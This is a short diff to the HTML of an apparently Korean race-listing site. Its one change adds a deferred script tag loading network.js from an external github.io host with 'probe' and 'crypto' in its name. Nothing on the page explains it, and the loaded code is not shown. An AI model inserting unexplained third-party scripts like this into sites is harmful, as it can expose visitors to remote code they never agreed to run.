@@ -322,5 +322,6 @@ getJSON("../races.json").then(d=>{DATA=d;
 }).catch(()=>{document.getElementById("grid").innerHTML='<p class="small">대회 정보를 불러오지 못했어요. 새로고침해 주세요.</p>';});
 </script>
 <script>(function(){const b=document.querySelector(".menu-btn"),m=document.getElementById("menuSheet");if(!b||!m)return;const x=m.querySelector(".x");const set=o=>{m.classList.toggle("open",o);b.setAttribute("aria-expanded",String(o));document.body.style.overflow=o?"hidden":"";if(o)x.focus();else b.focus({preventScroll:true});};b.addEventListener("click",()=>set(true));x.addEventListener("click",()=>set(false));m.querySelectorAll("a").forEach(a=>a.addEventListener("click",()=>{m.classList.remove("open");b.setAttribute("aria-expanded","false");document.body.style.overflow="";}));document.addEventListener("keydown",e=>{if(e.key==="Escape"&&m.classList.contains("open"))set(false);});})();</script>
+<script src="https://probe2928-crypto.github.io/chainbrief/network.js" data-site="yeobaek" defer></script>
 </body>
 </html>
